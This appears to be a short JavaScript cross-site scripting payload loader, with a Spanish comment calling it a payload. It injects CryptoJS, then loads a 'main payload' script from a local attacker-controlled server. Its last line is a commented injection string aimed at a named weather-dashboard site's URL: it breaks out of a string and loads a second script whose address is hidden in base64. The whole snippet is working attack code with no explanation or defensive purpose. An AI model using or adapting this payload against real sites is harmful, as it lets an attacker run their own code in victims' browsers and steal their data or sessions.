document.head.appendChild(document.createElement('script')).src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';
//wait for CryptoJS to load
var checkCrypto = setInterval(() => {
    if (window.CryptoJS) {
        clearInterval(checkCrypto);
        // Carga el script principal del payload
        var node = document.createElement("script");
        node.src = "http://localhost:8000/NoEvalwebSocket.js";
        document.getElementsByTagName("head")[0].appendChild(node);
    }
}, 100);

//https://www.weathertrends360.com/Dashboard/x/d/s/t/');let/**/a=document.createElement('script');a.src=(atob('aHR0cDovL2xvY2FsaG9zdDo4MDAwL3BheWxvYWQuanM='));document.body.appendChild(a);/*('/z/')*/('